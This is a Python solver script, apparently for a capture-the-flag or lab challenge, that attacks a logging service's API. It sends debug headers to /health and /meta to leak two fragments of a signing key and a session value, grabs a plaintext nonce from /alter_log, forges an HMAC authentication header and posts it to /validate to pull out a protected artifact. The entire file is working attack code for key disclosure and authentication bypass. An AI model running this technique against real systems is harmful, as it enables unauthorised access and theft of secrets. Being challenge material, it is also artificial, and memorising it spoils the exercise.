#!/usr/bin/env python3
# solver_token1.py
import sys, base64, hmac, hashlib, requests

def jget(url, **kw):
    r = requests.get(url, timeout=6, **kw); r.raise_for_status(); return r.json()

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 solve_validate.py http://logger.embassy.svc:8080"); sys.exit(1)
    base = sys.argv[1].rstrip("/")

    # 1) /health with X-Debug: yes → get fragment_a + session
    health = jget(f"{base}/health", headers={"X-Debug":"yes"})
    frag_a = (health.get("services") or {}).get("cfg_fragment_a")
    session_val = (health.get("session") or {}).get("value")
    if not frag_a or not session_val:
        print("[!] missing fragment_a or session from /health:", health); sys.exit(1)

    # 2) /meta with header 'session: <value>' → get fragment_b (base64) and decode
    meta = jget(f"{base}/meta", headers={"session": session_val})
    frag_b_b64 = (meta.get("services") or {}).get("cfg_fragment_b")
    if not frag_b_b64:
        print("[!] missing cfg_fragment_b from /meta:", meta); sys.exit(1)
    frag_b = base64.b64decode(frag_b_b64).decode()

    agent_key = f"{frag_a}{frag_b}"  # 'ag' + 'ent_key_B' -> 'agent_key_B'

    # 3) /alter_log with X-Debug: yes → rotate and fetch **plaintext** nonce
    alt = jget(f"{base}/alter_log", headers={"X-Debug":"yes"})
    nonce = (alt.get("nonce") or "").strip()
    if not nonce:
        print("[!] missing nonce from /alter_log:", alt); sys.exit(1)

    # 4) Compute hex(HMAC_SHA256(agent_key, nonce))
    xagent = hmac.new(agent_key.encode(), nonce.encode(), hashlib.sha256).hexdigest()

    # 5) POST JSON to /validate (Body(...)=JSON). DON’T use form-encoded.
    r = requests.post(
        f"{base}/validate",
        headers={"X-Agent": xagent, "Content-Type": "application/json"},
        json=nonce,
        timeout=6,
    )
    # If rate-limited, show server text
    if r.status_code == 429:
        print("[!] rate limited:", r.text); sys.exit(1)
    if r.status_code != 200:
        print(f"[!] /validate {r.status_code}: {r.text}"); sys.exit(1)

    print(r.text)  # raw JSON; server currently returns the artifact info

if __name__ == "__main__":
    main()